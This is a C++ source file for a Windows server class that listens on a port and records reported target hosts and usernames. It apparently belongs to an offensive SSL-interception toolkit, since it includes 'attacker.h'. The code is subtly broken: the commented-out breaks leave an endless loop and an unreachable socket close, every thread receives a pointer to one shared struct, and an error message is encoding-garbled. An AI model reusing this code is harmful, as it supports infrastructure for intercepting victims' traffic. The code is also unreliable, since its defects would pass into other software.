#include <conio.h>
#include "informerproc.h"
#include "../utils/BaseSocket.h"
#include "../attacker.h"
#include "../informer.h"
#include "informerClient.h"
#include "sslPublic.h"
#include "../HttpUtils.h"
#include "../DnsUtils/dnsUtils.h"
#include "InformerUdp.h"



int __stdcall InformerProc::informerProc(LPCONNECTION_INFO lpclientinfo) {

	CONNECTION_INFO connectinfo = *lpclientinfo;
	int s = connectinfo.sock;

	int sslovertime = INFORMER_SOCKET_TIMEOUT;
	int ret = setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char *)&sslovertime, sizeof(int));

	while (1)
	{
		char szbuf[4096+16];
		int recvlen = recv(s, szbuf, 4096, 0);
		if (recvlen > 0)
		{
			*(szbuf + recvlen) = 0;

			LPTARGET_INFO lpinfo = (LPTARGET_INFO)szbuf;
			if (lpinfo->cmd == TARGET_INFO_TAG )
			{
				unsigned long ip = lpinfo->ip;
				string username = string((char*)lpinfo->user, 16);

				unsigned long inetip = connectinfo.sa.sin_addr.S_un.S_addr;

				string strhost = DnsUitls::dns2Host(lpinfo->host);

				ret = connectinfo.ssltarget->storeTarget(strhost, username);                             
			}
			else {
				//break;
			}
		}
		else {
			int error = GetLastError();
			//break;
		}
	}

	closesocket(s);
	return 0;
}



InformerProc::InformerProc() {
	if (mInstance)
	{
		return;
	}

	mInstance = this;
	
	mClients = new InformerClient();

	mUdp = new InformerUDP(mClients);

	CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)informerListener, this, 0, 0));

}


InformerProc::~InformerProc() {
	delete mClients;
}

int __stdcall InformerProc::informerListener(InformerProc * instance) {

	int targetServerSock = BaseSocket::listenPort(INFORMER_PORT);
	if (targetServerSock == INVALID_SOCKET)
	{
		printf("targetServer listenPort error\r\n");
		_getch();
		MessageBoxA(0, "TargetServer listen error", "TargetServer listen error", MB_OK);
		ExitProcess(0);
		return -1;
	}

	CONNECTION_INFO connectinfo = { 0 };
	while (TRUE)
	{
		int iClientSockSize = sizeof(sockaddr_in);
		DWORD dwThreadid = 0;
		connectinfo.ssltarget = instance->mClients;
		connectinfo.udptarget = instance->mUdp;

		connectinfo.sock = accept(targetServerSock, (sockaddr*)&connectinfo.sa, &iClientSockSize);
		if (connectinfo.sock != INVALID_SOCKET)
		{
			CloseHandle(CreateThread(0, PROXY_THREAD_STACK_SIZE, (LPTHREAD_START_ROUTINE)informerProc,
				(LPVOID)&connectinfo, STACK_SIZE_PARAM_IS_A_RESERVATION, &dwThreadid));
			Sleep(0);
		}
		else
		{
			printf("targetServer¼àÌýÏß³Ìaccept´íÎóÂë:%d\r\n", WSAGetLastError());
			continue;
		}
	}

}